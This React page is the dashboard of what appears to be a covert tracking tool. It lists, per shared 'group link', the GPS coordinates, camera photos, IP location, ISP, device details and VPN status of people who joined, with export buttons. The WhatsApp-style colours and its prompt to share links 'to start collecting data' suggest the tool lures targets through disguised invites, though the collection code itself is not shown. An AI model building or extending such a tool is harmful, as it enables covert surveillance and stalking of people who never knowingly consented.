'use client';

import { useState, useEffect } from 'react';
import { CollectedData } from '@/lib/dataCollection';
import { exportGroupData, exportAllData } from '@/lib/dataExport';
import { checkGroupData } from '@/lib/checkData';
import { Download, MagnifyingGlass, Users, MapPin, Shield, Clock, Warning, CheckCircle, XCircle } from '@phosphor-icons/react';

export default function ViewDataPage() {
  const [allData, setAllData] = useState<CollectedData[]>([]);
  const [selectedGroup, setSelectedGroup] = useState<string>('all');
  const [groups, setGroups] = useState<string[]>([]);
  const [checkGroupId, setCheckGroupId] = useState<string>('');
  const [checkResult, setCheckResult] = useState<any>(null);

  useEffect(() => {
    loadData();
  }, []);

  const loadData = () => {
    // Load all tracking data
    const data = JSON.parse(localStorage.getItem('tracking_data') || '[]') as CollectedData[];
    setAllData(data);
    
    // Get unique group IDs
    const uniqueGroups = [...new Set(data.map((d: CollectedData) => d.metadata.groupId))] as string[];
    setGroups(uniqueGroups);
  };

  const filteredData = selectedGroup === 'all' 
    ? allData 
    : allData.filter(d => d.metadata.groupId === selectedGroup);

  const handleCheckGroup = () => {
    if (!checkGroupId.trim()) {
      alert('Please enter a group ID');
      return;
    }
    const result = checkGroupData(checkGroupId.trim());
    setCheckResult(result);
  };


  // Calculate statistics
  const stats = {
    total: filteredData.length,
    withGPS: filteredData.filter(d => d.gpsLocation).length,
    withPhoto: filteredData.filter(d => d.cameraImage).length,
    suspicious: filteredData.filter(d => d.analysis.flags.length > 0).length,
    vpnDetected: filteredData.filter(d => d.ipLocation?.isVPN).length,
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-[#e5ddd5] via-[#f0f2f5] to-[#e5ddd5] py-8 px-4 sm:py-12 sm:px-6">
      <div className="max-w-7xl mx-auto">
        {/* Header Section - Centered and Professional */}
        <div className="text-center mb-8">
          <div className="inline-flex items-center justify-center w-20 h-20 bg-gradient-to-br from-[#128C7E] to-[#075E54] rounded-2xl mb-4 shadow-xl">
            <Shield className="w-12 h-12 text-white" weight="fill" />
          </div>
          <h1 className="text-4xl sm:text-5xl font-bold text-[#1f1f1f] mb-3">Tracking Data Dashboard</h1>
          <p className="text-lg text-[#667781] max-w-2xl mx-auto">Monitor and analyze all collected tracking data in real-time</p>
        </div>

        {/* Main Dashboard Card */}
        <div className="bg-white rounded-3xl shadow-2xl p-6 sm:p-8 mb-6 border border-[#e4e6eb]">
          <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4 mb-8">
            <div className="flex-1">
              <h2 className="text-xl font-bold text-[#1f1f1f] mb-1">Overview</h2>
              <p className="text-sm text-[#667781]">Real-time statistics and data insights</p>
            </div>
            <div className="flex flex-wrap gap-3">
              {selectedGroup !== 'all' && (
                <button
                  onClick={() => exportGroupData(selectedGroup)}
                  className="px-6 py-3 bg-[#128C7E] text-white rounded-xl hover:bg-[#075E54] transition-all shadow-lg hover:shadow-xl flex items-center space-x-2 font-semibold"
                >
                  <Download className="w-5 h-5" weight="bold" />
                  <span>Export Group</span>
                </button>
              )}
              <button
                onClick={exportAllData}
                className="px-6 py-3 bg-[#25D366] text-white rounded-xl hover:bg-[#20BA5A] transition-all shadow-lg hover:shadow-xl flex items-center space-x-2 font-semibold"
              >
                <Download className="w-5 h-5" weight="bold" />
                <span>Export All Data</span>
              </button>
            </div>
          </div>

          {/* Statistics Cards - Centered Grid */}
          <div className="grid grid-cols-2 sm:grid-cols-5 gap-4 mb-8">
            <div className="bg-gradient-to-br from-[#128C7E] to-[#075E54] rounded-xl p-4 text-white shadow-lg">
              <div className="flex items-center space-x-2 mb-2">
                <Users className="w-5 h-5" weight="bold" />
                <span className="text-xs font-medium opacity-90">Total Entries</span>
              </div>
              <p className="text-2xl sm:text-3xl font-bold">{stats.total}</p>
            </div>
            <div className="bg-gradient-to-br from-[#25D366] to-[#20BA5A] rounded-xl p-4 text-white shadow-lg">
              <div className="flex items-center space-x-2 mb-2">
                <MapPin className="w-5 h-5" weight="bold" />
                <span className="text-xs font-medium opacity-90">With GPS</span>
              </div>
              <p className="text-2xl sm:text-3xl font-bold">{stats.withGPS}</p>
            </div>
            <div className="bg-gradient-to-br from-[#667781] to-[#8696a0] rounded-xl p-4 text-white shadow-lg">
              <div className="flex items-center space-x-2 mb-2">
                <Shield className="w-5 h-5" weight="bold" />
                <span className="text-xs font-medium opacity-90">With Photo</span>
              </div>
              <p className="text-2xl sm:text-3xl font-bold">{stats.withPhoto}</p>
            </div>
            <div className="bg-gradient-to-br from-[#d93025] to-[#c33] rounded-xl p-4 text-white shadow-lg">
              <div className="flex items-center space-x-2 mb-2">
                <Warning className="w-5 h-5" weight="bold" />
                <span className="text-xs font-medium opacity-90">Suspicious</span>
              </div>
              <p className="text-2xl sm:text-3xl font-bold">{stats.suspicious}</p>
            </div>
            <div className="bg-gradient-to-br from-[#f59e0b] to-[#d97706] rounded-xl p-4 text-white shadow-lg">
              <div className="flex items-center space-x-2 mb-2">
                <Shield className="w-5 h-5" weight="bold" />
                <span className="text-xs font-medium opacity-90">VPN Detected</span>
              </div>
              <p className="text-2xl sm:text-3xl font-bold">{stats.vpnDetected}</p>
            </div>
          </div>
          
          {/* Filter Section - Centered */}
          <div className="bg-gradient-to-r from-[#f0f2f5] to-[#e5e8eb] rounded-2xl p-6 mb-6 border-2 border-[#e4e6eb]">
            <div className="max-w-4xl mx-auto">
              <div className="flex flex-col sm:flex-row sm:items-end gap-4">
                <div className="flex-1">
                  <label className="block text-sm font-bold text-[#1f1f1f] mb-3 flex items-center space-x-2">
                    <Users className="w-5 h-5 text-[#128C7E]" weight="bold" />
                    <span>Filter by Group</span>
                  </label>
                  <select
                    value={selectedGroup}
                    onChange={(e) => setSelectedGroup(e.target.value)}
                    className="w-full px-5 py-3.5 bg-white border-2 border-[#e4e6eb] rounded-xl focus:ring-4 focus:ring-[#128C7E]/20 focus:border-[#128C7E] outline-none font-semibold text-[#1f1f1f] shadow-sm hover:shadow-md transition-all"
                  >
                    <option value="all">📊 All Groups ({groups.length})</option>
                    {groups.map(groupId => (
                      <option key={groupId} value={groupId}>🔗 {groupId}</option>
                    ))}
                  </select>
                </div>
                <div className="bg-white rounded-xl px-6 py-4 border-2 border-[#128C7E] shadow-lg">
                  <p className="text-xs text-[#667781] mb-1 font-medium">Currently Showing</p>
                  <p className="text-2xl font-bold text-[#128C7E]">{filteredData.length}</p>
                  <p className="text-xs text-[#8696a0] mt-1">{filteredData.length === 1 ? 'entry' : 'entries'}</p>
                </div>
              </div>
            </div>
          </div>

          {/* Check Group Data - Centered */}
          <div className="bg-gradient-to-br from-[#f0f2f5] via-[#e5e8eb] to-[#f0f2f5] rounded-2xl p-6 border-2 border-[#e4e6eb]">
            <div className="max-w-3xl mx-auto">
              <h3 className="text-lg font-bold text-[#1f1f1f] mb-5 flex items-center justify-center space-x-2">
                <MagnifyingGlass className="w-6 h-6 text-[#128C7E]" weight="bold" />
                <span>Quick Check Group Data</span>
              </h3>
              <div className="flex flex-col sm:flex-row gap-3 mb-4">
                <input
                  type="text"
                  value={checkGroupId}
                  onChange={(e) => setCheckGroupId(e.target.value)}
                  placeholder="Enter group ID (e.g., j0d5ne9u3xm)"
                  className="flex-1 px-5 py-3.5 bg-white border-2 border-[#e4e6eb] rounded-xl focus:ring-4 focus:ring-[#128C7E]/20 focus:border-[#128C7E] outline-none font-mono text-sm shadow-sm hover:shadow-md transition-all"
                />
                <button
                  onClick={handleCheckGroup}
                  className="px-8 py-3.5 bg-[#128C7E] text-white rounded-xl hover:bg-[#075E54] transition-all font-bold shadow-lg hover:shadow-xl"
                >
                  Check Now
                </button>
              </div>
              {checkResult && (
              <div className={`mt-4 p-4 rounded-xl border-2 ${
                checkResult.exists 
                  ? 'bg-green-50 border-green-200' 
                  : 'bg-red-50 border-red-200'
              }`}>
                {checkResult.exists ? (
                  <div className="space-y-3">
                    <div className="flex items-center space-x-2">
                      <CheckCircle className="w-6 h-6 text-green-600" weight="fill" />
                      <p className="text-base font-bold text-green-700">Group Found!</p>
                    </div>
                    <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 text-sm">
                      <div>
                        <p className="text-xs text-[#667781] mb-1">Group Name</p>
                        <p className="font-semibold text-[#1f1f1f]">{checkResult.groupInfo?.name || 'Unknown'}</p>
                      </div>
                      <div>
                        <p className="text-xs text-[#667781] mb-1">Created</p>
                        <p className="font-semibold text-[#1f1f1f]">
                          {checkResult.groupInfo?.createdAt ? new Date(checkResult.groupInfo.createdAt).toLocaleDateString() : 'Unknown'}
                        </p>
                      </div>
                      <div>
                        <p className="text-xs text-[#667781] mb-1">Tracking Entries</p>
                        <p className="font-semibold text-[#1f1f1f]">{checkResult.trackingDataCount}</p>
                      </div>
                    </div>
                    {checkResult.hasData ? (
                      <div className="flex items-center space-x-2 mt-3 p-2 bg-green-100 rounded-lg">
                        <CheckCircle className="w-5 h-5 text-green-600" weight="fill" />
                        <p className="text-sm text-green-700 font-semibold">✓ Data is stored and ready to export</p>
                      </div>
                    ) : (
                      <div className="flex items-center space-x-2 mt-3 p-2 bg-yellow-100 rounded-lg">
                        <Warning className="w-5 h-5 text-yellow-600" weight="fill" />
                        <p className="text-sm text-yellow-700 font-semibold">⚠ No tracking data yet (no one has joined)</p>
                      </div>
                    )}
                  </div>
                ) : (
                  <div className="flex items-center space-x-2">
                    <XCircle className="w-6 h-6 text-red-600" weight="fill" />
                    <p className="text-base font-bold text-red-700">Group not found in storage</p>
                  </div>
                )}
              </div>
              )}
            </div>
          </div>
        </div>

        {/* Data Cards Section - Centered */}
        <div className="mt-8">
          <div className="text-center mb-6">
            <h2 className="text-2xl sm:text-3xl font-bold text-[#1f1f1f] mb-2">Collected Data</h2>
            <p className="text-[#667781]">Detailed information for each entry</p>
          </div>
          
          {filteredData.length > 0 ? (
            <div className="grid gap-6 md:grid-cols-2 lg:grid-cols-3 max-w-7xl mx-auto">
            {filteredData.map((data, index) => (
              <div key={index} className="bg-white rounded-2xl shadow-xl p-6 hover:shadow-2xl transition-all border border-[#e4e6eb]">
              {/* Entry Header */}
              <div className="flex items-center justify-between mb-4 pb-3 border-b-2 border-[#e4e6eb]">
                <div className="flex items-center space-x-2">
                  <div className="w-10 h-10 bg-gradient-to-br from-[#128C7E] to-[#075E54] rounded-full flex items-center justify-center text-white font-bold">
                    #{index + 1}
                  </div>
                  <div>
                    <p className="text-xs text-[#8696a0]">Entry</p>
                    <p className="text-sm font-semibold text-[#1f1f1f]">
                      {new Date(data.metadata.timestamp).toLocaleDateString()}
                    </p>
                  </div>
                </div>
                {data.analysis.flags.length > 0 ? (
                  <div className="flex items-center space-x-1 px-2 py-1 bg-red-100 rounded-lg">
                    <Warning className="w-4 h-4 text-red-600" weight="fill" />
                    <span className="text-xs font-semibold text-red-600">{data.analysis.flags.length}</span>
                  </div>
                ) : (
                  <div className="flex items-center space-x-1 px-2 py-1 bg-green-100 rounded-lg">
                    <CheckCircle className="w-4 h-4 text-green-600" weight="fill" />
                    <span className="text-xs font-semibold text-green-600">Safe</span>
                  </div>
                )}
              </div>

              {/* Camera Image - Prominent Display */}
              {data.cameraImage ? (
                <div className="mb-5 p-4 bg-gradient-to-br from-[#e5f3ff] to-[#d1e7ff] rounded-xl border-2 border-[#128C7E]/30">
                  <h3 className="text-sm font-bold text-[#1f1f1f] mb-3 flex items-center space-x-2">
                    <Shield className="w-5 h-5 text-[#128C7E]" weight="fill" />
                    <span>📷 Captured Photo</span>
                  </h3>
                  <div className="relative">
                    <img 
                      src={data.cameraImage} 
                      alt="Captured photo from user's camera" 
                      className="w-full rounded-xl border-2 border-[#128C7E]/50 max-h-64 object-cover shadow-lg hover:shadow-xl transition-all cursor-pointer"
                      onClick={() => {
                        // Open image in new tab for full view
                        const newWindow = window.open();
                        if (newWindow) {
                          newWindow.document.write(`<img src="${data.cameraImage}" style="max-width:100%; height:auto;" />`);
                        }
                      }}
                    />
                    <div className="absolute top-2 right-2 bg-[#128C7E] text-white px-2 py-1 rounded-lg text-xs font-semibold shadow-lg">
                      Click to View Full Size
                    </div>
                  </div>
                  <div className="mt-3 flex items-center justify-between">
                    <p className="text-xs text-[#667781]">
                      <span className="font-semibold">Status:</span> {data.metadata.cameraPermissionStatus}
                    </p>
                    <p className="text-xs text-[#128C7E] font-semibold">✓ Photo Captured</p>
                  </div>
                </div>
              ) : (
                <div className="mb-5 p-4 bg-[#f0f2f5] rounded-xl border-2 border-dashed border-[#e4e6eb] text-center">
                  <Shield className="w-8 h-8 text-[#8696a0] mx-auto mb-2" weight="bold" />
                  <p className="text-xs text-[#8696a0] font-medium">No photo captured</p>
                  <p className="text-xs text-[#8696a0] mt-1">Camera permission was denied or not available</p>
                </div>
              )}

              {/* Location */}
              <div className="mb-4 p-3 bg-[#f0f2f5] rounded-xl">
                <h3 className="text-sm font-semibold text-[#1f1f1f] mb-3 flex items-center space-x-2">
                  <MapPin className="w-4 h-4 text-[#128C7E]" weight="bold" />
                  <span>Location Data</span>
                </h3>
                {data.gpsLocation && (
                  <p className="text-xs text-[#667781]">
                    GPS: {data.gpsLocation.latitude.toFixed(4)}, {data.gpsLocation.longitude.toFixed(4)}
                  </p>
                )}
                {data.ipLocation && (
                  <>
                    <p className="text-xs text-[#667781]">
                      IP: {data.ipLocation.city}, {data.ipLocation.region}, {data.ipLocation.country}
                    </p>
                    {data.ipLocation.timezone && data.ipLocation.timezone !== 'Unknown' && (
                      <p className="text-xs text-[#8696a0]">
                        Timezone: {data.ipLocation.timezone}
                      </p>
                    )}
                    {data.ipLocation.currency && data.ipLocation.currency !== 'Unknown' && (
                      <p className="text-xs text-[#8696a0]">
                        Currency: {data.ipLocation.currency} ({data.ipLocation.currencyName})
                      </p>
                    )}
                    {data.ipLocation.isp && data.ipLocation.isp !== 'Unknown' && (
                      <p className="text-xs text-[#8696a0]">
                        ISP: {data.ipLocation.isp}
                      </p>
                    )}
                  </>
                )}
                {data.analysis.locationMismatch && (
                  <p className="text-xs text-red-600 mt-1">⚠️ Location Mismatch</p>
                )}
              </div>

              {/* Device */}
              <div className="mb-4 p-3 bg-[#f0f2f5] rounded-xl">
                <h3 className="text-sm font-semibold text-[#1f1f1f] mb-3 flex items-center space-x-2">
                  <Shield className="w-4 h-4 text-[#128C7E]" weight="bold" />
                  <span>Device Information</span>
                </h3>
                <p className="text-xs text-[#667781]">
                  {data.deviceInfo.type} • {data.deviceInfo.os} • {data.deviceInfo.browser}
                </p>
                {data.analysis.deviceMismatch && (
                  <p className="text-xs text-red-600 mt-1">⚠️ Device Mismatch</p>
                )}
              </div>

              {/* Network */}
              {data.networkInfo && (
                <div className="mb-4 p-3 bg-[#f0f2f5] rounded-xl">
                  <h3 className="text-sm font-semibold text-[#1f1f1f] mb-3 flex items-center space-x-2">
                    <Shield className="w-4 h-4 text-[#128C7E]" weight="bold" />
                    <span>Network Information</span>
                  </h3>
                  <p className="text-xs text-[#667781]">
                    {data.networkInfo.connectionType} • {data.networkInfo.effectiveType}
                  </p>
                  {data.ipLocation?.isVPN && (
                    <p className="text-xs text-red-600 mt-1">⚠️ VPN Detected</p>
                  )}
                  {data.ipLocation?.isProxy && (
                    <p className="text-xs text-red-600 mt-1">⚠️ Proxy Detected</p>
                  )}
                </div>
              )}

              {/* Flags */}
              {data.analysis.flags.length > 0 && (
                <div className="mb-4 p-3 bg-red-50 border-2 border-red-200 rounded-xl">
                  <h3 className="text-sm font-semibold text-red-700 mb-3 flex items-center space-x-2">
                    <Warning className="w-4 h-4 text-red-600" weight="fill" />
                    <span>Suspicious Indicators ({data.analysis.flags.length})</span>
                  </h3>
                  <ul className="text-xs text-red-700 space-y-2">
                    {data.analysis.flags.slice(0, 5).map((flag, i) => (
                      <li key={i} className="flex items-start space-x-2">
                        <span className="text-red-500 mt-0.5">•</span>
                        <span>{flag}</span>
                      </li>
                    ))}
                    {data.analysis.flags.length > 5 && (
                      <li className="text-red-600 font-semibold">+{data.analysis.flags.length - 5} more flags</li>
                    )}
                  </ul>
                </div>
              )}

              {/* Footer Info */}
              <div className="pt-4 border-t-2 border-[#e4e6eb] flex items-center justify-between">
                <div>
                  <p className="text-xs text-[#8696a0] mb-1 flex items-center space-x-1">
                    <Clock className="w-3 h-3" />
                    <span>{new Date(data.metadata.timestamp).toLocaleString()}</span>
                  </p>
                  <p className="text-xs text-[#8696a0] font-mono">
                    ID: {data.metadata.groupId.substring(0, 10)}...
                  </p>
                </div>
              </div>
              </div>
            ))}
            </div>
          ) : (
            <div className="bg-white rounded-3xl shadow-2xl p-16 text-center border-2 border-[#e4e6eb] max-w-2xl mx-auto">
              <div className="inline-flex items-center justify-center w-24 h-24 bg-gradient-to-br from-[#e4e6eb] to-[#d1d5db] rounded-full mb-6">
                <Users className="w-12 h-12 text-[#8696a0]" weight="bold" />
              </div>
              <h3 className="text-2xl font-bold text-[#1f1f1f] mb-3">No Data Available</h3>
              <p className="text-[#667781] mb-2 text-lg">No tracking data found for the selected filter.</p>
              <p className="text-sm text-[#8696a0]">Share your group links to start collecting data!</p>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

